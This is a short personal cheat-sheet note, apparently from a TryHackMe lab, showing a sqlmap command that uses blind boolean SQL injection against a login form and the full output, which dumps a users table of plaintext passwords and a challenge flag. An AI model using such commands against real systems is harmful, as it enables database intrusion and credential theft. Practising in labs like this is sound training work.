---
id: sqlmap
aliases:
  - BASICS
tags: []
---

### BASICS
#### Password Extraction

Example
```
$ sqlmap -u http://10.10.143.153:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
...
[05:29:50] [INFO] fetching tables for database: 'SQLite_masterdb'
[05:29:50] [INFO] fetching number of tables for database 'SQLite_masterdb'
[05:29:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[05:29:50] [INFO] retrieved: 1
[05:29:53] [INFO] retrieved: users
[05:30:18] [INFO] retrieved: CREATE TABLE users (     id integer primary key,     username text unique not null,     password text not null )
[05:36:28] [INFO] fetching entries for table 'users'
[05:36:28] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[05:36:28] [INFO] retrieved: 5
[05:36:31] [INFO] retrieved: 1
[05:36:35] [INFO] retrieved: THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}
[05:38:48] [INFO] retrieved: admin
[05:39:04] [INFO] retrieved: 3
[05:39:08] [INFO] retrieved: asd
[05:39:18] [INFO] retrieved: amanda
[05:39:36] [INFO] retrieved: 2
[05:39:41] [INFO] retrieved: Summer2019!
[05:40:18] [INFO] retrieved: dev
[05:40:30] [INFO] retrieved: 5
[05:40:35] [INFO] retrieved: 345m3io4hj3
[05:41:12] [INFO] retrieved: emil
[05:41:24] [INFO] retrieved: 4
[05:41:29] [INFO] retrieved: viking123
[05:41:59] [INFO] retrieved: maja
Database: <current>
Table: users
[5 entries]
+----+---------------------------------------+----------+
| id | password                              | username |
+----+---------------------------------------+----------+
| 1  | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb} | admin    |
| 3  | asd                                   | amanda   |
| 2  | Summer2019!                           | dev      |
| 5  | 345m3io4hj3                           | emil     |
| 4  | viking123                             | maja     |
+----+---------------------------------------+----------+

[05:42:12] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.143.153/dump/SQLite_masterdb/users.csv'
[05:42:12] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.143.153'

[*] ending @ 05:42:12 /2024-01-23/
...
```
